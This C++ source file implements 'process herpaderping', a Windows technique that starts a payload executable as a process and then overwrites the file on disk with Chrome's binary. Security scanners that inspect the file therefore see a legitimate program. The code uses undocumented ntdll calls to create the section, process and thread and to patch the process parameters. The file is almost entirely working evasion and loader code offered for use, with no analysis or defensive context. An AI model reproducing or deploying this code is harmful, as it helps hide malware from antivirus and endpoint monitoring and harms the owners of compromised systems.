#include <iostream>
#include <Windows.h>
#include <memory>
#include "NtdllFunctions.h"

using namespace std;

const int PROCESS_CREATE_FLAGS_INHERIT_HANDLES = 0x00000004;

//0x7c8 bytes (sizeof)
using PEB64 = struct
{
    UCHAR InheritedAddressSpace;                                            //0x0
    UCHAR ReadImageFileExecOptions;                                         //0x1
    UCHAR BeingDebugged;                                                    //0x2
    union
    {
        UCHAR BitField;                                                     //0x3
        struct
        {
            UCHAR ImageUsesLargePages:1;                                    //0x3
            UCHAR IsProtectedProcess:1;                                     //0x3
            UCHAR IsImageDynamicallyRelocated:1;                            //0x3
            UCHAR SkipPatchingUser32Forwarders:1;                           //0x3
            UCHAR IsPackagedProcess:1;                                      //0x3
            UCHAR IsAppContainer:1;                                         //0x3
            UCHAR IsProtectedProcessLight:1;                                //0x3
            UCHAR IsLongPathAwareProcess:1;                                 //0x3
        };
    };
    UCHAR Padding0[4];                                                      //0x4
    ULONGLONG Mutant;                                                       //0x8
    ULONGLONG ImageBaseAddress;                                             //0x10
    ULONGLONG Ldr;                                                          //0x18
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters;                                            //0x20
    ULONGLONG SubSystemData;                                                //0x28
    ULONGLONG ProcessHeap;                                                  //0x30
    ULONGLONG FastPebLock;                                                  //0x38
    ULONGLONG AtlThunkSListPtr;                                             //0x40
    ULONGLONG IFEOKey;                                                      //0x48
    union
    {
        ULONG CrossProcessFlags;                                            //0x50
        struct
        {
            ULONG ProcessInJob:1;                                           //0x50
            ULONG ProcessInitializing:1;                                    //0x50
            ULONG ProcessUsingVEH:1;                                        //0x50
            ULONG ProcessUsingVCH:1;                                        //0x50
            ULONG ProcessUsingFTH:1;                                        //0x50
            ULONG ProcessPreviouslyThrottled:1;                             //0x50
            ULONG ProcessCurrentlyThrottled:1;                              //0x50
            ULONG ProcessImagesHotPatched:1;                                //0x50
            ULONG ReservedBits0:24;                                         //0x50
        };
    };
    UCHAR Padding1[4];                                                      //0x54
    union
    {
        ULONGLONG KernelCallbackTable;                                      //0x58
        ULONGLONG UserSharedInfoPtr;                                        //0x58
    };
    ULONG SystemReserved;                                                   //0x60
    ULONG AtlThunkSListPtr32;                                               //0x64
    ULONGLONG ApiSetMap;                                                    //0x68
    ULONG TlsExpansionCounter;                                              //0x70
    UCHAR Padding2[4];                                                      //0x74
    ULONGLONG TlsBitmap;                                                    //0x78
    ULONG TlsBitmapBits[2];                                                 //0x80
    ULONGLONG ReadOnlySharedMemoryBase;                                     //0x88
    ULONGLONG SharedData;                                                   //0x90
    ULONGLONG ReadOnlyStaticServerData;                                     //0x98
    ULONGLONG AnsiCodePageData;                                             //0xa0
    ULONGLONG OemCodePageData;                                              //0xa8
    ULONGLONG UnicodeCaseTableData;                                         //0xb0
    ULONG NumberOfProcessors;                                               //0xb8
    ULONG NtGlobalFlag;                                                     //0xbc
    union _LARGE_INTEGER CriticalSectionTimeout;                            //0xc0
    ULONGLONG HeapSegmentReserve;                                           //0xc8
    ULONGLONG HeapSegmentCommit;                                            //0xd0
    ULONGLONG HeapDeCommitTotalFreeThreshold;                               //0xd8
    ULONGLONG HeapDeCommitFreeBlockThreshold;                               //0xe0
    ULONG NumberOfHeaps;                                                    //0xe8
    ULONG MaximumNumberOfHeaps;                                             //0xec
    ULONGLONG ProcessHeaps;                                                 //0xf0
    ULONGLONG GdiSharedHandleTable;                                         //0xf8
    ULONGLONG ProcessStarterHelper;                                         //0x100
    ULONG GdiDCAttributeList;                                               //0x108
    UCHAR Padding3[4];                                                      //0x10c
    ULONGLONG LoaderLock;                                                   //0x110
    ULONG OSMajorVersion;                                                   //0x118
    ULONG OSMinorVersion;                                                   //0x11c
    USHORT OSBuildNumber;                                                   //0x120
    USHORT OSCSDVersion;                                                    //0x122
    ULONG OSPlatformId;                                                     //0x124
    ULONG ImageSubsystem;                                                   //0x128
    ULONG ImageSubsystemMajorVersion;                                       //0x12c
    ULONG ImageSubsystemMinorVersion;                                       //0x130
    UCHAR Padding4[4];                                                      //0x134
    ULONGLONG ActiveProcessAffinityMask;                                    //0x138
    ULONG GdiHandleBuffer[60];                                              //0x140
    ULONGLONG PostProcessInitRoutine;                                       //0x230
    ULONGLONG TlsExpansionBitmap;                                           //0x238
    ULONG TlsExpansionBitmapBits[32];                                       //0x240
    ULONG SessionId;                                                        //0x2c0
    UCHAR Padding5[4];                                                      //0x2c4
    union _ULARGE_INTEGER AppCompatFlags;                                   //0x2c8
    union _ULARGE_INTEGER AppCompatFlagsUser;                               //0x2d0
    ULONGLONG pShimData;                                                    //0x2d8
    ULONGLONG AppCompatInfo;                                                //0x2e0
    struct _STRING64 CSDVersion;                                            //0x2e8
    ULONGLONG ActivationContextData;                                        //0x2f8
    ULONGLONG ProcessAssemblyStorageMap;                                    //0x300
    ULONGLONG SystemDefaultActivationContextData;                           //0x308
    ULONGLONG SystemAssemblyStorageMap;                                     //0x310
    ULONGLONG MinimumStackCommit;                                           //0x318
    ULONGLONG SparePointers[4];                                             //0x320
    ULONG SpareUlongs[5];                                                   //0x340
    ULONGLONG WerRegistrationData;                                          //0x358
    ULONGLONG WerShipAssertPtr;                                             //0x360
    ULONGLONG pUnused;                                                      //0x368
    ULONGLONG pImageHeaderHash;                                             //0x370
    union
    {
        ULONG TracingFlags;                                                 //0x378
        struct
        {
            ULONG HeapTracingEnabled:1;                                     //0x378
            ULONG CritSecTracingEnabled:1;                                  //0x378
            ULONG LibLoaderTracingEnabled:1;                                //0x378
            ULONG SpareTracingBits:29;                                      //0x378
        };
    };
    UCHAR Padding6[4];                                                      //0x37c
    ULONGLONG CsrServerReadOnlySharedMemoryBase;                            //0x380
    ULONGLONG TppWorkerpListLock;                                           //0x388
    struct LIST_ENTRY64 TppWorkerpList;                                     //0x390
    ULONGLONG WaitOnAddressHashTable[128];                                  //0x3a0
    ULONGLONG TelemetryCoverageHeader;                                      //0x7a0
    ULONG CloudFileFlags;                                                   //0x7a8
    ULONG CloudFileDiagFlags;                                               //0x7ac
    CHAR PlaceholderCompatibilityMode;                                      //0x7b0
    CHAR PlaceholderCompatibilityModeReserved[7];                           //0x7b1
    ULONGLONG LeapSecondData;                                               //0x7b8
    union
    {
        ULONG LeapSecondFlags;                                              //0x7c0
        struct
        {
            ULONG SixtySecondEnabled:1;                                     //0x7c0
            ULONG Reserved:31;                                              //0x7c0
        };
    };
    ULONG NtGlobalFlag2;                                                    //0x7c4
};

typedef LONG KPRIORITY;

using PROCESS_BASIC_INFORMATION = struct
{
    NTSTATUS ExitStatus;
    PEB64* PebBaseAddress;
    ULONG_PTR AffinityMask;
    KPRIORITY BasePriority;
    HANDLE UniqueProcessId;
    HANDLE InheritedFromUniqueProcessId;
};

#define NT_SUCCESS(Status)              (((NTSTATUS)(Status)) >= 0)

FORCEINLINE VOID RtlInitUnicodeString(
        _Out_ PUNICODE_STRING DestinationString,
        _In_opt_ PCWSTR SourceString
)
{
    if (SourceString)
        DestinationString->MaximumLength = (DestinationString->Length = (USHORT)(wcslen(SourceString) * sizeof(WCHAR))) + sizeof(UNICODE_NULL);
    else
        DestinationString->MaximumLength = DestinationString->Length = 0;

    DestinationString->Buffer = (PWCH)SourceString;
}


int main()
{
    HANDLE herpaderping_file_handle = ::CreateFileA("herpaderp.exe", GENERIC_READ | GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if(herpaderping_file_handle == INVALID_HANDLE_VALUE){
        std::cerr << "Can't open handle to herpaderp.exe and the error code is " << ::GetLastError << endl;
        return -1;
    }

    HANDLE payload_file_handle = ::CreateFileA("payload.exe", GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if(payload_file_handle == INVALID_HANDLE_VALUE){
        cerr << "Can't open handle to payload.exe and the error code is " << ::GetLastError() << endl;
        return -1;
    }


    DWORD high_order_bits_payload_size = 0;
    DWORD low_order_bits_payload_size = ::GetFileSize(payload_file_handle, &high_order_bits_payload_size);
    ULONGLONG payload_size = low_order_bits_payload_size | (static_cast<ULONGLONG>(high_order_bits_payload_size) << (sizeof(DWORD) * 8));

    auto payload_bytes = std::make_unique<BYTE[]>(payload_size);
    if(!ReadFile(payload_file_handle, payload_bytes.get(), payload_size, nullptr, nullptr))
        cerr << "Can't read the payload and the error code is " << ::GetLastError() << endl;

    if(!::WriteFile(herpaderping_file_handle, payload_bytes.get(), payload_size, nullptr, nullptr))
        cerr << "Can't write to herpaderp.exe and the error code is " << ::GetLastError() << endl;

    HANDLE section_handle = nullptr;
    NtdllFunctions::_NtCreateSection(&section_handle, SECTION_ALL_ACCESS, nullptr, nullptr, PAGE_READONLY, SEC_IMAGE, herpaderping_file_handle);

    HANDLE process_handle = nullptr;
    LONG b = NtdllFunctions::_NtCreateProcessEx(&process_handle, PROCESS_ALL_ACCESS, nullptr, GetCurrentProcess(), PROCESS_CREATE_FLAGS_INHERIT_HANDLES, section_handle, nullptr, nullptr, FALSE);

    ::SetFilePointer(herpaderping_file_handle, 0, nullptr, FILE_BEGIN);
    HANDLE chrome_file_handle = CreateFileA("<Chrome_Path>", GENERIC_READ, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    auto chrome_file_size = GetFileSize(chrome_file_handle, nullptr);
    auto chrome_file_content = std::make_unique<BYTE[]>(chrome_file_size);
    ::ReadFile(chrome_file_handle, chrome_file_content.get(), chrome_file_size, nullptr, nullptr);
    ::WriteFile(herpaderping_file_handle, chrome_file_content.get(), chrome_file_size, nullptr, nullptr);

    PROCESS_BASIC_INFORMATION pbi;
    NtdllFunctions::_NtQueryInformationProcess(process_handle, ProcessBasicInformation, &pbi, sizeof(pbi), nullptr);

    PEB64 process_peb;
    ReadProcessMemory(process_handle, pbi.PebBaseAddress, &process_peb, sizeof(process_peb), nullptr);

    PRTL_USER_PROCESS_PARAMETERS process_parameters = nullptr;
    UNICODE_STRING image_path_name;
    UNICODE_STRING command_line;
    UNICODE_STRING title;
    UNICODE_STRING desktop_info;
    PROCESS_BASIC_INFORMATION current_process_pbi;
    PEB64 current_process_peb;

    NtdllFunctions::_NtQueryInformationProcess(GetCurrentProcess(), ProcessBasicInformation, &current_process_pbi, sizeof(current_process_pbi), nullptr);
    current_process_peb = *current_process_pbi.PebBaseAddress;
    RtlInitUnicodeString(&image_path_name, L"<Image_Full_Path>");
    RtlInitUnicodeString(&command_line, L"\"<Image_Full_Path>\"");
    RtlInitUnicodeString(&title, L"You have been herpaderped!");
    RtlInitUnicodeString(&desktop_info, L"WinSta0\\Default");
    NtdllFunctions::_RtlCreateProcessParametersEx(&process_parameters, &image_path_name, nullptr, nullptr, &command_line, current_process_peb.ProcessParameters->Environment, &title, &desktop_info, nullptr, nullptr, 0);
    auto process_memory = VirtualAllocEx(process_handle, nullptr, process_parameters->MaximumLength + process_parameters->EnvironmentSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (nullptr != process_parameters->Environment)
    {
        process_parameters->Environment = reinterpret_cast<PBYTE>(process_memory) + process_parameters->Length;
    }
    if(WriteProcessMemory(process_handle, process_memory, process_parameters, process_parameters->MaximumLength + process_parameters->EnvironmentSize, nullptr) == 0)
        cerr << "Can't write process memory to process_handle (first WriteProcessMemory) and the error code is " << ::GetLastError() << endl;
    if(WriteProcessMemory(process_handle, reinterpret_cast<PBYTE>(pbi.PebBaseAddress) + offsetof(PEB64, ProcessParameters), &process_memory, sizeof(process_memory), nullptr) == 0)
        cerr << "Can't write process memory to process_handle (second WriteProcessMemory) and the error code is " << ::GetLastError() << endl;



    const PIMAGE_DOS_HEADER payload_dos_header = reinterpret_cast<PIMAGE_DOS_HEADER>(payload_bytes.get());
    const PIMAGE_NT_HEADERS64 payload_nt_headers = reinterpret_cast<PIMAGE_NT_HEADERS64>(payload_bytes.get() + payload_dos_header->e_lfanew);

    ULONGLONG entry_point = payload_nt_headers->OptionalHeader.AddressOfEntryPoint + process_peb.ImageBaseAddress;

    HANDLE thread_handle = nullptr;
    NtdllFunctions::_NtCreateThreadEx(&thread_handle, THREAD_ALL_ACCESS, nullptr, process_handle, reinterpret_cast<PVOID>(entry_point), nullptr, 0, 0, 0, 0, nullptr);

    CloseHandle(herpaderping_file_handle);
    CloseHandle(thread_handle);

    return 0;
}